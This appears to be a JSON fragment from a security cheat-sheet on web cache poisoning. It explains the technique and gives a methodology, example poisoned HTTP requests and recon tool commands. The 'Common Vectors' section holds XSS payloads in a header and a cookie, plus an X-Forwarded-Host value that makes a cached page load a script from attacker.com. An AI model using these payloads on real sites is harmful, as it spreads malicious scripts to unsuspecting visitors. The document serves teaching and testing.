    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.\n\nFundamentally, it involves two phases:\n1. **Elicit a response**: Work out how to force the back-end server to include a dangerous payload in its response.\n2. **Cache the response**: Ensure the malicious response is stored in the cache and served to victims.\n\nThis can be used to distribute XSS, JavaScript injection, open redirections, and more."
        },
        {
            "heading": "Methodology",
            "type": "code_block",
            "content": [
                "# 1. Identify Unkeyed Inputs",
                "- Use ParamMiner to find hidden headers like X-Forwarded-Host, X-Forwarded-Scheme, etc.",
                "- Use tools like Arjun or Parth to discover unkeyed parameters.",
                "",
                "# 2. Elicit a Dangerous Response",
                "- Send payloads in unkeyed inputs and check if they reflect in the response.",
                "- Example: X-Forwarded-Host: a.\"><script>alert(1)</script>\"",
                "",
                "# 3. Get the Response Cached",
                "- Identify the cache key (usually Method + Path + Host).",
                "- Monitor cache headers: X-Cache (HIT/MISS), Age, Cache-Control.",
                "- Send the request until you see a 'HIT' with your payload."
            ]
        },
        {
            "heading": "Common Vectors",
            "type": "code_block",
            "content": [
                "# X-Forwarded-Host Injection",
                "GET /en?region=uk HTTP/1.1",
                "Host: innocent-website.com",
                "X-Forwarded-Host: attacker.com",
                "",
                "# Resulting response (cached):",
                "<script src=\"//attacker.com/scripts/tracker.js\"></script>",
                "",
                "# Cookie-based Cache Poisoning",
                "GET / HTTP/1.1",
                "Host: innocent-website.com",
                "Cookie: language=es\"><script>alert(1)</script>",
                "",
                "# Multiple Headers (Path Overlap)",
                "X-Forwarded-Host: attacker.com",
                "X-Forwarded-Scheme: http"
            ]
        },
        {
            "heading": "Tools",
            "type": "code_block",
            "content": [
                "# Web Cache Vulnerability Scanner (WCVS)",
                "wcvs -u https://target.com",
                "",
                "# Parameter Discovery",
                "python3 arjun.py -u https://target.com --get",
                "python3 parth.py -t target.com",
                "",
                "# URL & Parameter Mining",
                "python3 paramspider.py --domain target.com",
                "python parameth.py -u https://target.com/test.php"
            ]
        }
    ],
